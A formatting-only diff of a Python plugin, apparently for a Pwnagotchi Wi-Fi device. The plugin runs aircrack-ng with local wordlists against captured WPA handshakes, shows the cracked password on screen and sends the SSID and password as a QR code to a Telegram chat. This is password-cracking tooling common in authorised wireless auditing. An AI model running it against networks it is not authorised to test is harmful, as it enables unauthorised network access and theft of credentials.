@@ -6,7 +6,7 @@ import re
 import qrcode
 import io
 import os
-from telegram import Bot #install with pip install python-telegram-bot
+from telegram import Bot  # install with pip install python-telegram-bot
 
 '''
 Aircrack-ng needed, to install:
@@ -48,17 +48,17 @@ class QuickDic(plugins.Plugin):
             self.options['api'] = None
         if 'id' not in self.options:
             self.options['id'] = None
-            
+
         check = subprocess.run(
             ('/usr/bin/dpkg -l aircrack-ng | grep aircrack-ng | awk \'{print $2, $3}\''), shell=True, stdout=subprocess.PIPE)
         check = check.stdout.decode('utf-8').strip()
         if check != "aircrack-ng <none>":
-            logging.info('[quickdic] Found %s' %check)
+            logging.info('[quickdic] Found %s' % check)
         else:
             logging.warning('[quickdic] aircrack-ng is not installed!')
 
-        #if self.options['id'] != None and self.options['api'] != None:
-            #self._send_message(filename='Android AP', pwd='12345678')
+        # if self.options['id'] != None and self.options['api'] != None:
+            # self._send_message(filename='Android AP', pwd='12345678')
 
     def on_handshake(self, agent, filename, access_point, client_station):
         display = agent.view()
@@ -74,17 +74,17 @@ class QuickDic(plugins.Plugin):
                 'wordlist_folder'] + '*.txt | sed \'s/ /,/g\'` -l ' + filename + '.cracked -q -b ' + result + ' ' + filename + ' | grep KEY'),
                 shell=True, stdout=subprocess.PIPE)
             result2 = result2.stdout.decode('utf-8').strip()
-            logging.info('[quickdic] %s' %result2)
+            logging.info('[quickdic] %s' % result2)
             if result2 != "KEY NOT FOUND":
                 key = re.search(r'\[(.*)\]', result2)
                 pwd = str(key.group(1))
                 self.text_to_set = "Cracked password: " + pwd
-                #logging.warning('!!! [quickdic] !!! %s' % self.text_to_set)
+                # logging.warning('!!! [quickdic] !!! %s' % self.text_to_set)
                 display.set('face', self.options['face'])
                 display.set('status', self.text_to_set)
                 self.text_to_set = ""
                 display.update(force=True)
-                #plugins.on('cracked', access_point, pwd)
+                # plugins.on('cracked', access_point, pwd)
                 if self.options['id'] != None and self.options['api'] != None:
                     self._send_message(filename, pwd)
 
@@ -98,7 +98,7 @@ class QuickDic(plugins.Plugin):
             wifi_config = 'WIFI:S:'+ssid+';T:'+security+';P:'+password+';;'
             bot = Bot(token=self.options['api'])
             chat_id = int(self.options['id'])
-                    
+
             qr = qrcode.QRCode(
                 version=None,
                 error_correction=qrcode.constants.ERROR_CORRECT_L,
@@ -107,26 +107,27 @@ class QuickDic(plugins.Plugin):
             )
             qr.add_data(wifi_config)
             qr.make(fit=True)
-                        
-                        # Create an image from the QR code instance
-                        #img = qr.make_image(fill_color="black", back_color="white")
+
+            # Create an image from the QR code instance
+            # img = qr.make_image(fill_color="black", back_color="white")
             q = io.StringIO()
             qr.print_ascii(out=q)
             q.seek(0)
 
-                        # Convert the image to bytes
-                        #image_bytes = io.BytesIO()
-                        #img.save(image_bytes)
-                        #image_bytes.seek(0)
+            # Convert the image to bytes
+            # image_bytes = io.BytesIO()
+            # img.save(image_bytes)
+            # image_bytes.seek(0)
 
-                        # Send the image directly as bytes
-                        #message_text = 'ssid: ' + ssid + ' password: ' + password
-                        #bot.send_photo(chat_id=chat_id, photo=InputFile(image_bytes, filename=ssid+'-'+password+'.txt'), caption=message_text)
+            # Send the image directly as bytes
+            # message_text = 'ssid: ' + ssid + ' password: ' + password
+            # bot.send_photo(chat_id=chat_id, photo=InputFile(image_bytes, filename=ssid+'-'+password+'.txt'), caption=message_text)
             message_text = f"\nSSID: {ssid}\nPassword: {password}\n```\n{q.read()}\n```"
-            bot.send_message(chat_id=chat_id, text=message_text, parse_mode='Markdown')
+            bot.send_message(chat_id=chat_id, text=message_text,
+                             parse_mode='Markdown')
             logging.info(message_text)
             logging.info("[better_quickdic] QR code content sent to Telegram.")
 
         except Exception as e:
-            logging.error(f"[better_quickdic] Error sending QR code content to Telegram: {str(e)}")
-           
+            logging.error(
+                f"[better_quickdic] Error sending QR code content to Telegram: {str(e)}")
